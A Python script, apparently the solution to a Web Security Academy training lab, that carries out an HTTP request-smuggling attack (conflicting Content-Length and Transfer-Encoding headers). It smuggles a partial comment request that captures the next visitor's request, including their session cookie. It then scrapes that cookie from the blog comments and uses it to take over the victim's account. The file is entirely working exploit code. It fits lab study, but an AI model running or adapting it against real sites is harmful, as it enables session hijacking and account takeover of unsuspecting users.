import socket
import sys
import ssl
import requests
from urllib.parse import quote
from bs4 import BeautifulSoup

site = '0aef00db032d06f78285ce5f0098000c.web-security-academy.net'
url = f'https://{site}/'

context = ssl.create_default_context()

# get CSRF token + cookie
url = f"https://{site}/post?postId=7"

s = requests.Session()
resp = s.get(url)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'}).get('value')

cookie = 'session=' + s.cookies.get('session')
print(cookie)
print()

# Check that comment field can be last
body = f'csrf={csrf}&postId=7&name=name&email={quote("email@gmail")}&website={quote("http://.com")}&comment=comment'
lines = [
    f'POST /post/comment HTTP/1.1',
    f'Host: {site}',
    f'Content-Type: application/x-www-form-urlencoded',
    f'Content-Length: {len(body)}',
    f'Cookie: {cookie}',
    '',
    body,
]
post = '\r\n'.join(lines)
print("===== Test Param Order =====")
print(post)
print()

with socket.create_connection((site, 443)) as sock:
    with context.wrap_socket(sock, server_hostname=site) as ssock:
        ssock.send(post.encode())
        resp = ssock.recv(4096)
        http = repr(resp)
        print(http)
        print()

# Set up attack
inner_post = [
    f'POST /post/comment HTTP/1.1',
    f'Content-Type: application/x-www-form-urlencoded',
    f'Content-Length: 950',
    f'Cookie: {cookie}',
    '',
    f'csrf={csrf}&postId=7&name=smuggler&email=smuggler%40email.com&website=http://&comment=owned',
]
inner = '\r\n'.join(inner_post)
lines = [
    f'POST / HTTP/1.1',
    f'Host: {site}',
    f'Content-Type: application/x-www-form-urlencoded',
    f'Content-Length: {len(inner)}',
    f'Transfer-Encoding: chunked',
    '',
    f'0',
    '',
    inner,
]

post = '\r\n'.join(lines)
print("===== Attack =====")
print(post)
print()

# Get session token
with socket.create_connection((site, 443)) as sock:
    with context.wrap_socket(sock, server_hostname=site) as ssock:
        ssock.send(post.encode())
        resp = ssock.recv(4096)
        http = resp.decode()
        print(http.split('\r\n\r\n')[0])
        print()

while True:
    resp = s.get(url)
    print(resp)
    print()
    if resp.status_code != 200:
        print("Retrying...")
        print()
        continue
    soup = BeautifulSoup(resp.text, 'html.parser')
    comments = soup.find_all('section', {'class': 'comment'})
    for comment in comments:
        text = comment.find_all('p')[1].get_text()
        if 'session=' in text:
            cookie = text.split('session=')[1].split('\r\n')[0]
            print('session: ', cookie)
            print()
            break
    break

# Log in to compromised account
print("===== Login =====")
url = f"https://{site}/my-account"
resp = s.get(url, cookies={'session': cookie})
if resp.status_code == 200:
    print('Level Solved')
